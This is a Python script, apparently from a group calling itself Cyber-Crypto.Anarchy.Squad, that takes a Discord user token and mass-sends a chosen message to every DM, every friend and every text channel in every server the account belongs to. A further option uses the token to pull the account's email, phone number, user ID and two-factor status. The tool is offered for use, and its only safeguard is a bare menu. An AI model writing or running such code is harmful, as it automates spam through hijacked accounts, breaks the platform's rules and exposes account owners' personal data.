import requests
import json
import os
import time
import datetime

cls = lambda: os.system('cls') if os.name == 'nt' else os.system('clear')

statuses = [200, 204, 429, 201]

intro = '''
 [===========================================]
 
 [ C.A.S ]~>           
 
 [ Discord Mailing Tool. 
 [ version 1.0       
 [ Created by Cyber-Crypto.Anarchy.Squad
 [ Telegram C.A.S - https://t.me/anarchy_squad
 [ Telegram Hydra crash bots - https://t.me/EvLVHydraNews
 
 [1] DM mailing.
 [2] Server mailing.
 [3] Grab info.
 [4] Exit.

 [===========================================]'''

def DMailing():
    try:
        dmId = []
        friendsId = []
        token = input('\nToken: ')
        userText = input('\nMailing text: ')
        headers = {'Authorization': token}
        spredSMS = {"content": userText, "tts": False}
        x = 0
        req = requests.get('https://discord.com/api/v9/users/@me/channels', headers=headers)
        req2 = requests.get('https://discord.com/api/v8/users/@me/relationships', headers=headers)
        if req.status_code in statuses:
            for dm in req.json():
                dmId.append(dm['id'])
        else:
            print(f"\n[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Error.")
        if req2.status_code in statuses:
            for friend in req2.json():
                friendsId.append(friend['id'])
            for ID in friendsId:
                req = requests.post(f'https://discord.com/api/v9/users/@me/channels', headers=headers, json={'recipients': [f'{ID}']})
                if req.json()['id'] not in dmId:
                    dmId.append(req.json()['id'])
        else:
            print(f"\n[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Error.")
        for IDspred in dmId:
                req = requests.post(f"https://canary.discord.com/api/v8/channels/{IDspred}/messages", headers=headers, json=spredSMS)
                if req.status_code not in statuses:
                    print(f"\n[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ Error message send.")
                else:
                    x += 1
                    print(f"\n[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ {x} message send. ]")
        print(f"\n[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Finished mailing.")
    except KeyboardInterrupt:
        print('\nExit...')
    nextCode = input('\nPress key to continue.')

def ServerMailing():
    try:
        serversId = []
        chatIds = []
        x = 0
        token = input('\nToken: ')
        userText = input('\nMailing text: ')
        headers = {'Authorization': token}
        json = {'content': userText}
        req = requests.get('https://discord.com/api/v8/users/@me/guilds', headers=headers)
        if req.status_code in statuses:
            for server in req.json():
                serversId.append(server['id'])
        for serverID in serversId:
            req2 = requests.get(f'https://discord.com/api/v8/guilds/{serverID}/channels', headers=headers)
            if req2.status_code in statuses:
                info = req2.json()
                for iD in info:
                    if iD["type"] == 0:
                        chatIds.append(iD['id'])
        for ID in chatIds:
            req = requests.post(f'https://discord.com/api/v9/channels/{ID}/messages', json=json, headers=headers)
            if req.status_code not in statuses:
                print(f"\n[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Error message send.")
            else:
                x += 1
                print(f"\n[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ {x} message send. ]")
        print(f"\n[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Finished mailing.")
    except KeyboardInterrupt:
        print('\nExit...')
    nextCode = input('\nPress key to continue.')

def grabInfo():
    try:
        token = input('\nToken: ')
        headers = {'Authorization': token, 'Content-Type': 'application/json'}  
        request = requests.get('https://canary.discordapp.com/api/v8/users/@me', headers=headers)
        if request.status_code in statuses:
            userName = request.json()['username'] + '#' + request.json()['discriminator']
            userID = request.json()['id']
            phone = request.json()['phone']
            email = request.json()['email']
            mfa = request.json()['mfa_enabled']
            print(f'''\n
  User Name: {userName}
  User ID: {userID}
  2 Factor: {mfa}
  Email: {email}
  Phone Number: {phone if phone else 'None.'}
            ''')
        else:
            print(f'Token {token} Invalid.')
    except KeyboardInterrupt:
        print('\nExit...')
    nextCode = input('\nPress key to continue.')       

while True:
    cls()
    print(intro)
    try:
        select = str(input('\nSelect: '))
        if select == '1':
            DMailing()
        elif select == '2':
            ServerMailing()
        elif select == '3':
            grabInfo()
        elif select == '4':
            print('\nGoodby!')
            time.sleep(2)
            exit()
        else:
            print('\nInvalid option.')
            nextCode = input('\nPress key to continue.')
    except KeyboardInterrupt:
        print('\nUse Item 18.')
        time.sleep(3)